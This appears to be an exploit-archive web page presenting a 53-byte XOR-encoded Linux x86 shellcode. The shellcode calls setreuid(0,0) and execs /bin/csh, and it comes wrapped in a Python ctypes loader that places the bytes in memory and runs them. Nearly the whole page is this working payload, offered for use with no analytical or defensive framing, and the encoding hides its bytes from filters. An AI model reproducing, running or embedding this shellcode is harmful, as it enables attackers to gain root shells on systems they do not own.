<html><head><title>Linux/x86 - setreuid (0,0) &amp; execve(/bin/csh, [/bin/csh, NULL]) + XOR encoded - 53 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Title: Linux x86 setreuid (0,0) &amp; execve(&quot;/bin/csh&quot;, [&quot;/bin/csh&quot;, NULL]) + XOR encoded - 53 bytes
# Author: egeektronic &lt;info (at) egeektronic {dot} com&gt;
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono

from ctypes import *

shell = &quot;\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x7c\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x16\x3a\x24\x4d\xa7\x4d\xb5\xb1\xfc\x4d\xae\x16\x77\x24\x2e\x14\x53\x1f\x0f\x14\x14\x53\x1e\x15\x12\xf5\x9f\x2e\x2f\xf5\x9d\xb1\xfc&quot;

memory = create_string_buffer(shell, len(shell))

shellcode = cast(memory, CFUNCTYPE(c_void_p))

shellcode()

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
